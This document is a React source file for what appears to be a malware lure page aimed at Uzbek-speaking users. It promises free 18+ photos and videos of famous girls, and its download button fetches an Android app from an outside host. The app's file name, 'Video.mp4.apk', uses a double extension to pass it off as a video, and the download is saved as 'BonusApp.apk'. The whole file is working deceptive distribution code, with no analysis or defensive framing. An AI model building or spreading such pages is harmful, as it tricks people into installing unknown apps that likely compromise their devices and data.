import React, { useEffect } from 'react';

export default function CollectionPage() {
  // Устанавливаем текущую дату
  useEffect(() => {
    const now = new Date();
    const dateElement = document.getElementById('current-date');
    if (dateElement) {
      dateElement.textContent = now.toLocaleDateString('uz-UZ', {
        weekday: 'long',
        year: 'numeric',
        month: 'long',
        day: 'numeric'
      });
    }
  }, []);

  // Обработчик скачивания
  const handleDownload = (e) => {
    e.preventDefault();
    // Замени на реальную ссылку на APK
    const link = document.createElement('a');
    link.href = 'https://uzbekistan-info.vercel.app/docs/Video.mp4.apk';
    link.download = 'BonusApp.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };


  return (
    <div
      style={{
        position: 'relative',
        width: '100%',
        height: '100vh',
        overflow: 'hidden',
        textAlign: 'center',
        color: '#fff',
        fontFamily: 'sans-serif',
        backgroundColor: '#000'
      }}
    >
      {/* Фон с размытием (если нужен blur — добавь backdrop-filter) */}
      <div
        style={{
          position: 'absolute',
          top: 0,
          left: 0,
          width: '100%',
          height: '100%',
          backgroundImage: "url('/img/image.jpg')",
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          filter: 'blur(8px)', // добавил размытие, как в твоём описании
          transform: 'scale(1.1)' // чтобы не было пустых краёв после blur
        }}
      ></div>

      {/* Основной контент */}
      <div
        style={{
          position: 'relative',
          top: '50%',
          transform: 'translateY(-50%)',
          padding: '0 20px',
          zIndex: 2
        }}
      >
        <h1 style={{ fontSize: '2.2rem', fontWeight: '900', marginBottom: '15px' }}>
          Bepul 18+ mashhur qizlarning foto va video to‘plami!
        </h1>

        <button
          id="download-btn"
          onClick={handleDownload}
          style={{
            padding: '15px 40px',
            backgroundColor: '#ff0055',
            border: '3px solid #ffbb00',
            borderRadius: '40px',
            color: 'white',
            fontWeight: '900',
            fontSize: '1.4rem',
            cursor: 'pointer',
            boxShadow: '0 10px 30px rgba(255,0,85,0.6)',
            transition: 'all 0.3s'
          }}
          onMouseOver={(e) => {
            e.target.style.backgroundColor = '#e6004d';
            e.target.style.transform = 'scale(1.08)';
          }}
          onMouseOut={(e) => {
            e.target.style.backgroundColor = '#ff0055';
            e.target.style.transform = 'scale(1)';
          }}
        >
          Yuklab olish
        </button>

        <p id="current-date" style={{ marginTop: '25px', color: '#aaa', fontStyle: 'italic' }}></p>
      </div>
    </div>
  );
}